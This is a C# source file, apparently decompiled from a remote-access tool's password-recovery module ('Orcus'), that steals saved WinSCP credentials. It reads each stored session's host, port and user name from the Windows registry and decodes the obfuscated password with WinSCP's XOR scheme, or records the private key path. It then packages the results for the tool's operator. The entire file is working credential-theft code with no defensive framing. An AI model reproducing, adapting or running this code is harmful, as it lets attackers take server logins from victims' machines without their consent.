using System;
using System.Collections.Generic;
using System.Linq;
using Microsoft.Win32;
using Orcus.Commands.Passwords.Utilities;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Applications.WinSCP;

internal class WinSCP : IPasswordRecovery
{
	public IEnumerable<RecoveredPassword> GetPasswords()
	{
		using RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\\\Martin Prikryl\\\\WinSCP 2\\\\Sessions");
		string[] subKeyNames = key.GetSubKeyNames();
		foreach (string name in subKeyNames)
		{
			using RegistryKey accountKey = key.OpenReadonlySubKeySafe(name);
			string text = accountKey?.GetValueSafe("HostName");
			if (!string.IsNullOrEmpty(text))
			{
				string valueSafe = accountKey.GetValueSafe("UserName");
				string text2 = WinSCPDecrypt(valueSafe, accountKey.GetValueSafe("Password"), text);
				string valueSafe2 = accountKey.GetValueSafe("PublicKeyFile");
				text = text + ":" + accountKey.GetValueSafe("PortNumber", "22");
				if (string.IsNullOrEmpty(text2) && !string.IsNullOrEmpty(valueSafe2))
				{
					text2 = $"[PRIVATE KEY LOCATION: \"{Uri.UnescapeDataString(valueSafe2)}\"]";
				}
				RecoveredPassword val = new RecoveredPassword();
				val.set_Field1(text);
				val.set_UserName(valueSafe);
				val.set_Password(text2);
				val.set_Application("WinSCP");
				val.set_PasswordType((PasswordType)2);
				yield return val;
			}
		}
	}

	private static int dec_next_char(List<string> list)
	{
		int num = int.Parse(list[0]);
		int num2 = int.Parse(list[1]);
		return 0xFF ^ ((((num << 4) + num2) ^ 0xA3) & 0xFF);
	}

	private static string WinSCPDecrypt(string user, string pass, string host)
	{
		try
		{
			if (!(user == string.Empty) && !(pass == string.Empty) && !(host == string.Empty))
			{
				List<string> list = pass.Select((char keyf) => keyf.ToString()).ToList();
				List<string> list2 = new List<string>();
				for (int i = 0; i < list.Count; i++)
				{
					if (list[i] == "A")
					{
						list2.Add("10");
					}
					if (list[i] == "B")
					{
						list2.Add("11");
					}
					if (list[i] == "C")
					{
						list2.Add("12");
					}
					if (list[i] == "D")
					{
						list2.Add("13");
					}
					if (list[i] == "E")
					{
						list2.Add("14");
					}
					if (list[i] == "F")
					{
						list2.Add("15");
					}
					if ("ABCDEF".IndexOf(list[i]) == -1)
					{
						list2.Add(list[i]);
					}
				}
				List<string> list3 = list2;
				int num;
				if (dec_next_char(list3) == 255)
				{
					num = dec_next_char(list3);
				}
				list3.Remove(list3[0]);
				list3.Remove(list3[0]);
				list3.Remove(list3[0]);
				list3.Remove(list3[0]);
				num = dec_next_char(list3);
				list3.Remove(list3[0]);
				list3.Remove(list3[0]);
				int num2 = dec_next_char(list3) * 2;
				for (int j = 0; j < num2; j++)
				{
					list3.Remove(list3[0]);
				}
				string text = "";
				for (int k = -1; k < num; k++)
				{
					string text2 = ((char)dec_next_char(list3)).ToString();
					list3.Remove(list3[0]);
					list3.Remove(list3[0]);
					text += text2;
				}
				string text3 = user + host;
				int count = text.IndexOf(text3, StringComparison.Ordinal);
				text = text.Remove(0, count);
				return text.Replace(text3, "");
			}
			return "";
		}
		catch
		{
			return "";
		}
	}
}
